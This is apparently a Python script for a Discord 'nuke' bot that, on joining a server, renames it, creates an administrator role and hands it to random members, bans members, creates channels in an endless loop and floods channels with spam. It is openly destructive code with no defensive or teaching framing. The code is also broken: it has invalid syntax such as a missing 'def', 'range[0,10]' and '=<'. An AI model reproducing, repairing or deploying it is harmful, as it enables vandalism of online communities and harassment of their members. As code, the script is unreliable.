import discord
from discord.ext import commands
import random

grenade = commands.Bot(command_prefix = 'xyz')



@grenade.event()
async on_guild_join(ctx, guild: discord.Guild):
  await ctx.guild.edit(name = "GUILDSPAMMED NYEHEHEHEHEHHEHE", icon = "guildicon.jpg")
  for i in range[0,10]:
    await ctx.guild.create_role(name='0202W03', color=discord.Color(0x3498DB))
  half_mems = len(ctx.guild.members)/2
  random_mem = random.choice(ctx.guild.members)
  admin = await ctx.guild.create_role(name='ADMIN LOL', permissions = discord.Permissions(8), color=discord.Color(0x3498DB))
  while i =< half_mems:
    await random_mem.add_role(admin)
    await guild.ban(random_mem)
    i += 1
  
  await ctx.send("EVERYONE HAS ADMIN PERMS, BAN WHO YOU WANT")
  while True:
    await ctx.guild.create_text_channel(f"GUILDSPAMMED BY YOUR OWN IDIOCY")
    await ctx.guild.create_voice_channel("GUILDSPAMMED SERVER BAD HAHA GET REKT") #  couldn't think of anything better haha 
  for channels in ctx.guild.text_channels:
    while True:
      await channels.send(":flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: :flushed: "
    
  
 
    
  
